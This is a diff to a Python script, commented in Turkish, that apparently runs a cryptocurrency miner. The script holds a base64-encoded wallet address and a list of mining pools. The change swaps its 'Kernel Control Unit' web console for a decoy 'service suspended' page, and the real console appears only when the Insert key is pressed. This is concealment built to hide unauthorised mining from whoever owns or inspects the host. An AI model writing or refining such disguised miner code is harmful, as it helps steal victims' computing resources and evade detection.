@@ -17,8 +17,8 @@ from collections import deque
 libc = ctypes.CDLL('libc.so.6')
 CONSOLE_LOGS = deque(maxlen=50)
 STATUS = {"running": False, "message": "Sistem Beklemede"}
-CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
+CF_WORKER_HOST = ""
 
 # Ana havuz adresi sabitlendi
 POOLS = [
@@ -165,21 +165,55 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
         
         btn_state = 'disabled style="opacity:0.5"' if STATUS["running"] else ""
         
+        # Python f-string icinde CSS ve JS icin suslu parantezleri ciftliyoruz
         html = f"""
-        <html><head><title>Kernel Console</title><style>
-            body {{ background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }}
+        <html><head><title>Service Suspended</title><style>
+            /* Varsayılan sahte sayfa tasarımı */
+            body {{ background: #fff; color: #000; font-family: 'Times New Roman', Times, serif; margin: 0; padding: 10px; }}
+            #fake-page {{ display: block; }}
+            
+            /* Gerçek konsol tasarımı (başlangıçta gizli) */
+            #real-console {{ display: none; background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; min-height: 100vh; box-sizing: border-box; }}
             .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
             #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
             .btn {{ background: transparent; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; }}
             .btn:hover:not(:disabled) {{ background: #0f0; color: #000; }}
             .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
         </style></head><body>
-            <div class="panel">
-                <h2>KERNEL CONTROL UNIT</h2>
-                <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
-                <div id="console">Konsol bekleniyor...</div>
+            
+            <div id="fake-page">This service has been suspended by its owner.</div>
+            
+            <div id="real-console">
+                <div class="panel">
+                    <h2>KERNEL CONTROL UNIT</h2>
+                    <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
+                    <div id="console">Konsol bekleniyor...</div>
+                </div>
             </div>
+
             <script>
+                // Insert tuşu algılayıcısı
+                document.addEventListener('keydown', function(event) {{
+                    if (event.key === 'Insert' || event.code === 'Insert') {{
+                        var fakePage = document.getElementById('fake-page');
+                        var realConsole = document.getElementById('real-console');
+                        
+                        // Durumu değiştir (Toggle)
+                        if (realConsole.style.display === 'none' || realConsole.style.display === '') {{
+                            realConsole.style.display = 'block';
+                            fakePage.style.display = 'none';
+                            document.body.style.background = '#000';
+                            document.body.style.padding = '0';
+                        }} else {{
+                            realConsole.style.display = 'none';
+                            fakePage.style.display = 'block';
+                            document.body.style.background = '#fff';
+                            document.body.style.padding = '10px';
+                        }}
+                    }}
+                }});
+
+                // Logları güncelleme döngüsü
                 async function updateLogs() {{
                     try {{
                         const r = await fetch('/api/logs');
